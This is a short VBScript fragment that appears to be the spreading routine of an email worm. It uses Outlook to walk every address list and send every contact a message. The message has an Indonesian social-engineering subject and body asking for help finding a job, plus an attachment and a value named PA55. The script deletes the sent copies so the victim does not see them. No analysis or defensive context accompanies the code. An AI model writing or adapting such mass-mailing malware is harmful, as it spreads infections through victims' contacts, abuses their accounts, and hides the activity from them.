   Set OutlookApp = CreateObject("Outlook.Application")
   If Not OutlookApp = "" Then
   For Each ContactSwitch In OutlookApp.GetNameSpace("MAPI").AddressLists
   For UserGroup = 1 To ContactSwitch.AddressEntries.Count
   Set OutlookEmail = OutlookApp.CreateItem(0)
   OutlookEmail.Recipients.Add ContactSwitch.AddressEntries(UserGroup)
   OutlookEmail.Subject = "Tolong dong..."
   OutlookEmail.Body = "Kenapa dari dulu hidupku seperti ini ?, kenapa ga ada perubahan yang berarti ?" & vbCrLf & "Tolong dong cariin aku kerjaan" & vbCrLf & vbCrLf & PA55
   OutlookEmail.Attachments.Add ATTCH
   OutlookEmail.DeleteAfterSubmit = True
   OutlookEmail.Send
   Next
   Next
   End If
